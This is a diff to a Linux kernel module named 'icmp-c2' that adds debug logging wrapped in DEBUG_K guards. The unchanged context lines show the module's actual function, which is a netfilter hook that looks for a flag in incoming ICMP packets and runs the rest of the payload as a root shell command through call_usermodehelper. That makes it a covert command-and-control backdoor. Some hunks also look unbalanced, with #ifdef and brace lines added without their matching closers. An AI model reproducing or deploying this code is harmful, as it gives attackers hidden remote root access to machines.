@@ -58,6 +58,8 @@ static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *
 static void icmp_handle_work(struct work_struct *work) {
     int ret;
 
+    #ifdef DEBUG_K
+        printk(KERN_DEBUG "Entering work handler...\n");
         printk(KERN_DEBUG "Queue length: %d", atomic_read(&work_count));
     #endif
     struct work_item *work_item = container_of(work, struct work_item, work);
@@ -65,6 +67,8 @@ static void icmp_handle_work(struct work_struct *work) {
     char *argv[] = { "/bin/bash", "-c", work_item->command, NULL };
     char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    #ifdef DEBUG_K
+    if (ret != 0){
         pr_err("Error (%d) executing command: \"%s\"\n", ret, work_item->command);
     }
     #endif
@@ -75,14 +79,20 @@ static void icmp_handle_work(struct work_struct *work) {
 }
 
 static int queue_execute(char *command){
+    #ifdef DEBUG_K
+        printk(KERN_DEBUG "Creating queue item...");
     #endif
     struct work_item *work = kmalloc(sizeof(struct work_item), GFP_KERNEL);
     work->command = command;
 
+    #ifdef DEBUG_K
+        printk(KERN_DEBUG "Queueing queue item...");
     #endif
     INIT_WORK(&work->work, icmp_handle_work);
     queue_work(work_queue, &work->work);
     atomic_inc(&work_count);
+    #ifdef DEBUG_K
+        printk(KERN_DEBUG "Enqueued");
     #endif
 
     return 0;
@@ -188,6 +198,8 @@ static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *
 
     // Send the ICMP Echo Request
     ret = kernel_sendmsg(raw_socket, &msg, &iov, 1, PACKET_SIZE);
+    #ifdef DEBUG_K
+        if (ret < 0) {
             pr_err("ICMP failed to reply: %d\n", ret);
         } else {
             pr_info("ICMP echo request sent successfully\n");
@@ -240,15 +252,23 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
 
     // Check for flag
     if(strncmp(payload, FLAG, FLAG_LEN) != 0){
+        #ifdef DEBUG_K
+            pr_info("Regular ICMP, no flag\n");
         #endif
         return NF_ACCEPT;
     }
     
+    #ifdef DEBUG_K
+        pr_info("Payload contained flag\n");
     #endif
 
     char *command = payload+FLAG_LEN;
+    #ifdef DEBUG_K
+        pr_info("Command: %s\n", command);
     #endif
     int status = queue_execute(command);
+    #ifdef DEBUG_K
+        pr_info("Status: %d\n", status);
     #endif
 
     // TODO: Check if ignore all is set
@@ -260,10 +280,14 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
 
 // Module initialization
 static int __init init_icmp_hijack(void) {
+    #ifdef DEBUG_K
+        printk(KERN_INFO "Loading icmp-c2 module...\n");
     #endif
 
     work_queue = create_singlethread_workqueue("work_queue");
     if (!work_queue) {
+        #ifdef DEBUG_K
+        printk(KERN_ERR "Failed to create workqueue\n");
         #endif
         return -ENOMEM;
     }
@@ -278,6 +302,8 @@ static int __init init_icmp_hijack(void) {
     // Register the hook
     nf_register_net_hook(&init_net, &nfho);
 
+    #ifdef DEBUG_K
+        printk(KERN_INFO "icmp handler loaded.\n");
     #endif
 
     return 0;
